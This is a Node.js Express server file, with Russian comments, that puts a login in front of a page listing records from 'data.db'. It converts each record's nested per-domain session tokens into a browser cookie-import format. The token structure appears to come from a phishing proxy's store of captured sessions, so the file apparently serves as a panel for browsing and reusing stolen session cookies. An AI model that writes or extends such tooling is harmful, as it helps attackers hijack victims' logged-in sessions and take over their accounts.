if (process.env.NODE_ENV !== 'production') {
  require('dotenv').config()
}

const express = require('express')
const app = express()
const path = require('path')
const fs = require('fs').promises
const users = require('./users')
const passport = require('passport')
const bcrypt = require('bcrypt')
const flash = require('express-flash')
const session = require('express-session')

app.set('views', path.join(__dirname, 'views'))
app.use(express.static(__dirname + '/public/'))
app.set('view-engine', 'ejs')
const logger = require('morgan')
app.use(logger('dev'))
//////////////////
app.use(
  express.urlencoded({
    extended: false,
  })
)

const initializePassport = require('./passport-config')

initializePassport(
  passport,
  (name) => users.find((user) => user.name === name),
  (id) => users.find((user) => user.id === id)
)

app.use(express.json())
app.use(flash())
app.use(
  session({
    secret: process.env.SESSION_SECRET,
    resave: false,
    saveUninitialized: false,
  })
)

app.use(passport.initialize())
app.use(passport.session())

//////////////////
app.get('/', checkAuthenticated, async (req, res) => {
  try {
    const fileContent = await fs.readFile('data.db', 'UTF-8')
    const fileLines = fileContent.split('\n')
    const dataMap = new Map()

    fileLines.forEach((line) => {
      if (line.trim().startsWith('{')) {
        try {
          const item = JSON.parse(line)
          let existingItem = dataMap.get(item.id)
          if (existingItem) {
            // Если для этого id уже есть запись, объединяем tokens
            let newTokens = []
            Object.keys(item.tokens).forEach((domain) => {
              Object.keys(item.tokens[domain]).forEach((tokenName) => {
                const tokenDetails = item.tokens[domain][tokenName]
                newTokens.push({
                  path: tokenDetails.Path || '/',
                  domain: domain,
                  expirationDate: tokenDetails.ExpirationDate, // Добавьте это поле, если оно доступно
                  value: tokenDetails.Value,
                  name: tokenName,
                  httpOnly: tokenDetails.HttpOnly,
                  hostOnly: tokenDetails.HostOnly, // Добавьте это поле, если оно доступно
                })
              })
            })
            existingItem.tokens = existingItem.tokens.concat(newTokens)
          } else {
            // Если записи с таким id нет, преобразуем tokens в массив
            let tokensArray = []
            Object.keys(item.tokens).forEach((domain) => {
              Object.keys(item.tokens[domain]).forEach((tokenName) => {
                const tokenDetails = item.tokens[domain][tokenName]
                tokensArray.push({
                  path: tokenDetails.Path || '/',
                  domain: domain,
                  expirationDate: tokenDetails.ExpirationDate, // Добавьте это поле, если оно доступно
                  value: tokenDetails.Value,
                  name: tokenName,
                  httpOnly: tokenDetails.HttpOnly,
                  hostOnly: tokenDetails.HostOnly, // Добавьте это поле, если оно доступно
                })
              })
            })
            item.tokens = tokensArray
            dataMap.set(item.id, item)
          }
        } catch (err) {
          console.error('Error parsing JSON from line:', line, err)
        }
      }
    })

    const uniqueData = Array.from(dataMap.values())
    res.render('index.ejs', { data: uniqueData })
  } catch (err) {
    console.error(err)
    res.status(500).send('Server Error')
  }
})

app.get('/login', checkNotAuthenticated, (req, res) => {
  res.render('login.ejs')
})

app.post(
  '/login',
  checkNotAuthenticated,
  passport.authenticate('local', {
    successRedirect: '/',
    failureRedirect: '/login',
    failureFlash: true,
  })
)

function checkAuthenticated(req, res, next) {
  if (req.isAuthenticated()) {
    return next()
  }
  res.redirect('/login')
}

function checkNotAuthenticated(req, res, next) {
  if (req.isAuthenticated()) {
    return res.redirect('/')
  }
  next()
}
console.log('Server Running on Port 4000...')
app.listen('4000')
